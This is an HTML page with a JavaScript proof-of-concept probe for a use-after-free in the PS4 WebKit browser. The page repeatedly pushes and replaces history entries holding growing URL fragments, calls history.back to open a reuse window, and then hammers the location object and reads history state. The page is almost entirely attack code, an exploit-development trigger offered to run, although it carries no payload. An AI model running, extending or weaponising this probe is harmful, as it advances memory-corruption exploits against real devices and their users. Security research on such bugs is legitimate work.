<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Location Object UAF Probe</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { font-size:16px; padding:10px; }
#log { white-space: pre-wrap; }
</style>
</head>

<body>
<h2>PS4 WebKit – HistoryItem → Location Reuse</h2>
<button onclick="run()">RUN LOCATION REUSE</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

async function run(){
    logEl.textContent = "";
    log("=== START LOCATION UAF PROBE ===");

    let size = 977;
    const STEP = 14461;

    // ---------------------------------
    // Phase 1 – Exact UAF trigger
    // ---------------------------------
    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));

        if(i % 6 === 0)
            setTimeout(()=>history.back(),0);

        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);

    // ---------------------------------
    // Phase 2 – Location Object Pressure
    // ---------------------------------
    log("[REUSE] Touching location object");

    let acc = 0;
    for(let i=0;i<2000;i++){
        try {
            acc ^= location.href.length;
            acc ^= location.hash.length;
            acc ^= location.pathname.length;
        } catch(e){}
    }

    log("ACC="+acc);

    // ---------------------------------
    // Phase 3 – History interaction
    // ---------------------------------
    log("[POST] Accessing history");
    try {
        log("history.length="+history.length);
    } catch(e){
        log("history exception");
    }

    log("=== END PROBE ===");
}
</script>
</body>
</html>
